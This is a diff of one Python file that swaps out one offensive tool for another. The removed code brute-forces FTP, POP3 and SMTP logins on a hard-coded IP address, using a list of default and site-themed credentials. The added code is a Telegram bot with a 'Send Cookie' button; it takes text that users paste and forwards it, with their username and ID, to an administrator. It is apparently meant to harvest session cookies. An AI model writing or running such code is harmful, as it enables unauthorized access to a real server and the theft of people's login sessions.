@@ -1,73 +1,58 @@
-import socket
-import poplib
-import smtplib
-import ftplib
-import time
+from aiogram import Bot, Dispatcher, F
+from aiogram.filters import CommandStart
+from aiogram.types import Message, KeyboardButton, ReplyKeyboardMarkup
+import asyncio
 
-ip = "45.94.158.128"
+BOT_TOKEN = "TOKEN"
+ADMIN_ID = 123456789  # Твой Telegram ID
 
-# Комбінації, які мають найбільший сенс для цього сайту
-creds = [
-    ("admin", "admin"),
-    ("admin", "password"),
-    ("admin", "123456"),
-    ("admin", "root"),
-    ("admin", "pntl"),
-    ("admin", "pntl2024"),
-    ("admin", "pntl2025"),
-    ("admin", "podilskyi"),
-    ("admin", "12345678"),
-    ("admin", "qwerty"),
-    ("root", "root"),
-    ("root", "password"),
-    ("root", "123456"),
-    ("root", "pntl"),
-    ("pntl", "pntl"),
-    ("pntl", "password"),
-    ("pntl", "123456"),
-    ("ftp", "ftp"),
-    ("ftp", "password"),
-    ("ftp", "123456"),
-    ("webmaster", "webmaster"),
-    ("webmaster", "password"),
-    ("user", "user"),
-    ("user", "password"),
-    ("test", "test"),
-    ("test", "password"),
-]
+bot = Bot(BOT_TOKEN)
+dp = Dispatcher()
 
-print("[*] Починаю перевірку...")
+waiting = set()
 
-for user, pwd in creds:
-    # === FTP ===
-    try:
-        ftp = ftplib.FTP(ip, timeout=3)
-        ftp.login(user, pwd)
-        print(f"[+] FTP: {user}:{pwd}")
-        ftp.quit()
-    except:
-        pass
+keyboard = ReplyKeyboardMarkup(
+    keyboard=[
+        [KeyboardButton(text="Отправить Cookie")]
+    ],
+    resize_keyboard=True
+)
 
-    # === POP3 ===
-    try:
-        pop = poplib.POP3(ip, timeout=3)
-        pop.user(user)
-        pop.pass_(pwd)
-        print(f"[+] POP3: {user}:{pwd}")
-        pop.quit()
-    except:
-        pass
+@dp.message(CommandStart())
+async def start(message: Message):
+    await message.answer(
+        "Нажмите кнопку ниже.",
+        reply_markup=keyboard
+    )
 
-    # === SMTP ===
-    try:
-        smtp = smtplib.SMTP(ip, 25, timeout=3)
-        smtp.ehlo()
-        smtp.login(user, pwd)
-        print(f"[+] SMTP: {user}:{pwd}")
-        smtp.quit()
-    except:
-        pass
+@dp.message(F.text == "Отправить Cookie")
+async def send_cookie(message: Message):
+    waiting.add(message.from_user.id)
+    await message.answer("Отправьте текст.")
 
-    print(f"[-] {user}:{pwd} не підійшов")
+@dp.message()
+async def get_text(message: Message):
+    if message.from_user.id not in waiting:
+        return
 
-print("[*] Перевірку завершено.")
+    waiting.remove(message.from_user.id)
+
+    username = f"@{message.from_user.username}" if message.from_user.username else "Нет"
+
+    await bot.send_message(
+        ADMIN_ID,
+        f"""Новое сообщение
+
+Username: {username}
+ID: {message.from_user.id}
+
+{message.text}"""
+    )
+
+    await message.answer("Отправлено.")
+
+async def main():
+    await dp.start_polling(bot)
+
+if __name__ == "__main__":
+    asyncio.run(main())
